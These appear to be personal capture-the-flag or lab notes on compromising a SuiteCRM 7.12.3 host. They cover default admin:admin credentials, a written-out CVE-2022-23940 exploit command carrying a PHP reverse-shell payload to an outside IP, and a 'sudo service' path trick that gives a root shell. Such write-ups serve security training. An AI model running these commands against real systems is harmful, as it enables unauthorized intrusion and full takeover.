#Pwned! 
```IP
192.168.232.146
```
# Enumeration

## HTTP 80
admin:admin
we are in

Suite CRM
Version 7.12.3
Sugar Version 6.5.25 (Build 344)
# Exploitation
https://github.com/manuelz120/CVE-2022-23940
```
python exploit.py -h http://192.168.232.146 -u admin -p admin --payload "php -r '\$sock=fsockopen(\"192.168.45.185\",4444);passthru(\"sh <&3 >&3 2>&3\");'"
```

# PrivEsc

## Manual
tty treatment
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241125110748.png?raw=true)

we can use sudo service 
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241125110828.png?raw=true)
with service we can access the file system without dropping privileges
```
sudo service ../../bin/sh
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241125110933.png?raw=true)
we are root now
## Automated

### Peass
### Mimikatz

# Lateral Movement

